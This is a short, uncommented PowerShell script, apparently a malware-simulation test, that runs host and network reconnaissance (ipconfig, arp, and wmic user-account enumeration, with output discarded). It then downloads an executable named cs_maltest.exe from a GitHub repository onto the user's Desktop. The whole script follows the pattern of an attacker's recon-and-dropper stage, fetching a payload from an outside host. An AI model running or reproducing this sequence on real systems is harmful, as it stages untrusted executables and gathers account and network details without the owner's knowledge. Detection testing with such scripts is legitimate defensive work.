cd $env:USERPROFILE
ipconfig /all | Out-Null
arp -a | Out-Null
wmic useraccount get /ALL | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
(New-Object System.Net.WebClient).DownloadFile('https://github.com/macigaiga/cstest/raw/master/cs_maltest.exe', "$env:USERPROFILE"+'/Desktop/cs_maltest.exe')
Start-Sleep -s 10
